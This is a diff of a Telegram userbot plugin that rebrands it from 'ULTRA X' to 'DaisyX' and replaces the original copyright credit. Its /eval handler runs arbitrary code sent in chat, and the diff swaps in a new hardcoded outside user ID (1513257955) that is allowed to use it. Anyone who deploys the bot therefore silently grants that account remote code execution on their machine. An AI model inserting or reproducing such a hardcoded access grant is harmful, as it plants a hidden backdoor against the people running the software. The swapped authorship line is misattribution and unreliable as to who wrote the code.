@@ -1,4 +1,6 @@
-# COPYRIGHT © BY ULTRA X
+# COPYRIGHT © BY Daisy X
+# Made By RoseLoverX
+
 import asyncio
 import io
 import os
@@ -6,17 +8,17 @@ import sys
 import traceback
 from .. import id
 from telethon import events
-from ULTRA import bot
+from DaisyX import bot
 
 
 @xbot.on(events.NewMessage(pattern="/eval ?(.*)"))
 async def _(event):
     pro = await bot.get_me()
     boy = pro.id
-    if event.sender_id == boy or event.sender_id == id or event.sender_id == 1619567296:
+    if event.sender_id == boy or event.sender_id == id or event.sender_id == 1513257955:
        pass
     else:
-       return await event.reply("deploy your own assistant check @UltraXoT")
+       return await event.reply("deploy your own assistant check @DaisyXoT")
     cmd = event.text.split(" ", maxsplit=1)[1]
     if not cmd:
         return await event.reply("What should I run ?..\n\nGive me something to run, u dumbo!!")
@@ -68,7 +70,7 @@ async def _(event):
     if event.sender_id == boy or event.sender_id == id:
        pass
     else:
-       return await event.reply("deploy your own assistant @UltraXoT")
+       return await event.reply("deploy your own assistant @DaisyXoT")
     cmd = event.text.split(" ", maxsplit=1)[1]
     if not cmd:
         return await event.reply("What should I execute?..\n\nGive me somwthing to execute, u dumbo!!")
